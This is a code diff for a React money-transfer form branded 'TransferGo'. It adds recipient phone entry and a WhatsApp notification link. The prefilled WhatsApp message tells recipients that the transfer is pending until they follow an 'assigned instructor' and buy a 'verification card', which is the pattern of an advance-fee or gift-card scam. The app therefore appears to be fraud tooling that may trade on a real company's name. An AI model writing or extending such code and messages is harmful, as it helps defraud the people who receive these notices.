@@ -9,7 +9,8 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { toast } from "sonner";
-import { ArrowRight, ArrowDownUp } from "lucide-react";
+import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { ArrowRight, ArrowDownUp, MessageCircle } from "lucide-react";
 
 const currencies = ["EUR", "USD", "GBP", "PLN", "TRY", "INR", "PHP", "UAH"];
 const countries = ["United States", "United Kingdom", "Poland", "Turkey", "India", "Philippines", "Ukraine", "Germany", "France"];
@@ -25,14 +26,17 @@ const NewTransfer = () => {
   const { user } = useAuth();
   const navigate = useNavigate();
   const [loading, setLoading] = useState(false);
+  const [whatsappLink, setWhatsappLink] = useState<string | null>(null);
   const [form, setForm] = useState({
     recipientName: "",
     recipientEmail: "",
+    recipientPhone: "",
     recipientCountry: "",
     sendAmount: "",
     sendCurrency: "EUR",
     receiveCurrency: "USD",
     paymentMethod: "bank_transfer",
+    notifyMethod: "email" as "email" | "whatsapp" | "both",
   });
 
   const exchangeRate = rates[form.sendCurrency]?.[form.receiveCurrency] ?? 1;
@@ -52,6 +56,7 @@ const NewTransfer = () => {
         sender_name: user.user_metadata?.full_name || user.email || "User",
         recipient_name: form.recipientName,
         recipient_email: form.recipientEmail || null,
+        recipient_phone: form.recipientPhone || null,
         recipient_country: form.recipientCountry,
         send_amount: sendNum,
         send_currency: form.sendCurrency,
@@ -61,21 +66,35 @@ const NewTransfer = () => {
         fee: parseFloat(fee.toFixed(2)),
         total_amount: parseFloat(totalAmount.toFixed(2)),
         payment_method: form.paymentMethod,
-      }).select().single();
+      } as any).select().single();
 
       if (error) throw error;
 
-      // Send notification to recipient
-      try {
-        await supabase.functions.invoke("send-transfer-notification", {
-          body: { transactionId: data.id },
-        });
-      } catch (notifErr) {
-        console.error("Notification error:", notifErr);
+      // Send email notification if email provided
+      if (form.recipientEmail && (form.notifyMethod === "email" || form.notifyMethod === "both")) {
+        try {
+          await supabase.functions.invoke("send-transfer-notification", {
+            body: { transactionId: data.id },
+          });
+        } catch (notifErr) {
+          console.error("Notification error:", notifErr);
+        }
+      }
+
+      // Generate WhatsApp link if phone provided
+      if (form.recipientPhone && (form.notifyMethod === "whatsapp" || form.notifyMethod === "both")) {
+        const phone = form.recipientPhone.replace(/[^0-9]/g, "");
+        const message = encodeURIComponent(
+          `Dear ${form.recipientName},\n\nGreat news! A transfer of ${receiveAmount.toFixed(2)} ${form.receiveCurrency} has been sent to you.\n\nTransaction Reference: ${data.reference_number}\n\nTo receive your funds, please follow your assigned instructor's guidance. A verification card must be purchased for approval and processing.\n\nThank you for using TransferGo.`
+        );
+        const link = `https://wa.me/${phone}?text=${message}`;
+        setWhatsappLink(link);
       }
 
       toast.success("Transfer created successfully!");
-      navigate(`/transactions/${data.id}`);
+      if (!form.recipientPhone || form.notifyMethod === "email") {
+        navigate(`/transactions/${data.id}`);
+      }
     } catch (error: any) {
       toast.error(error.message);
     } finally {
@@ -180,15 +199,44 @@ const NewTransfer = () => {
                   required
                 />
               </div>
+
               <div className="space-y-2">
-                <Label>Email (optional)</Label>
-                <Input
-                  type="email"
-                  value={form.recipientEmail}
-                  onChange={(e) => update("recipientEmail", e.target.value)}
-                  placeholder="recipient@email.com"
-                />
+                <Label>Notification Method</Label>
+                <Tabs value={form.notifyMethod} onValueChange={(v) => update("notifyMethod", v)} className="w-full">
+                  <TabsList className="w-full">
+                    <TabsTrigger value="email" className="flex-1">Email</TabsTrigger>
+                    <TabsTrigger value="whatsapp" className="flex-1">WhatsApp</TabsTrigger>
+                    <TabsTrigger value="both" className="flex-1">Both</TabsTrigger>
+                  </TabsList>
+                </Tabs>
               </div>
+
+              {(form.notifyMethod === "email" || form.notifyMethod === "both") && (
+                <div className="space-y-2">
+                  <Label>Recipient Email</Label>
+                  <Input
+                    type="email"
+                    value={form.recipientEmail}
+                    onChange={(e) => update("recipientEmail", e.target.value)}
+                    placeholder="recipient@email.com"
+                    required={form.notifyMethod === "email"}
+                  />
+                </div>
+              )}
+
+              {(form.notifyMethod === "whatsapp" || form.notifyMethod === "both") && (
+                <div className="space-y-2">
+                  <Label>Recipient Phone (with country code)</Label>
+                  <Input
+                    type="tel"
+                    value={form.recipientPhone}
+                    onChange={(e) => update("recipientPhone", e.target.value)}
+                    placeholder="+1234567890"
+                    required={form.notifyMethod === "whatsapp"}
+                  />
+                </div>
+              )}
+
               <div className="space-y-2">
                 <Label>Country</Label>
                 <Select value={form.recipientCountry} onValueChange={(v) => update("recipientCountry", v)}>
@@ -212,10 +260,30 @@ const NewTransfer = () => {
             </CardContent>
           </Card>
 
-          <Button type="submit" size="lg" className="w-full" disabled={loading}>
-            {loading ? "Processing..." : "Send Transfer"}
-            <ArrowRight className="ml-2 w-4 h-4" />
-          </Button>
+          {whatsappLink ? (
+            <div className="space-y-3">
+              <Button asChild size="lg" className="w-full bg-[#25D366] hover:bg-[#20BD5A] text-white">
+                <a href={whatsappLink} target="_blank" rel="noopener noreferrer">
+                  <MessageCircle className="mr-2 w-5 h-5" />
+                  Send WhatsApp Notification
+                </a>
+              </Button>
+              <Button
+                type="button"
+                variant="outline"
+                size="lg"
+                className="w-full"
+                onClick={() => navigate(`/transactions`)}
+              >
+                Skip & View Transactions
+              </Button>
+            </div>
+          ) : (
+            <Button type="submit" size="lg" className="w-full" disabled={loading}>
+              {loading ? "Processing..." : "Send Transfer"}
+              <ArrowRight className="ml-2 w-4 h-4" />
+            </Button>
+          )}
         </form>
       </div>
     </AppLayout>
